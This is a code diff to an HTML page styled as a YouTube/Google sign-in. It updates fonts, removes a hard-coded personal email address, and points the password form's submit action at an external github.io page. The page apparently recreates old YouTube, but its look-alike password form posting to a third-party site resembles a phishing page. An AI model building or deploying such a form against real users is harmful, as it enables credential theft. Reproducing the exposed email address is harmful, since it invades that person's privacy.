@@ -4,8 +4,9 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1" name="viewport">
   <title>YouTube</title>
-  <!-- Roboto Font Import -->
+  <!-- Roboto & Open Sans Font Imports -->
   <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600">
   <style>
     html, body {
       font-family: Arial, sans-serif;
@@ -33,8 +34,9 @@
       margin-bottom: 15px;
     }
 
+    /* Updated heading font to Open Sans */
     .heading-title {
-      font-family: 'Roboto', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      font-family: 'Open Sans', arial, sans-serif;
       font-size: 38px;
       font-weight: 300;
       color: #555;
@@ -282,14 +284,16 @@
       </div>
     </div>
 
-    <!-- Panel 2: Password -->
+<!-- Panel 2: Password -->
     <div id="passwordPanel" class="hidden">
-      <div id="displayEmail" class="profile-email">paquettej207@gmail.com</div>
-      <!-- Action target URL set to your YouTube page -->
-      <form id="passwordForm" action="youtube2016.html">
+      <div id="displayEmail" class="profile-email"></div>
+      
+      <!-- Change the action URL right here -->
+      <form id="passwordForm" action="https://joethelavaboy.github.io/Youtube2016/">
         <input type="password" id="Passwd" name="Passwd" placeholder="Password" required>
         <button type="submit" id="signIn" class="rc-button">Sign in</button>
       </form>
+      
       <div class="password-options">
         <label class="checkbox-label">
           <input type="checkbox" checked> Stay signed in
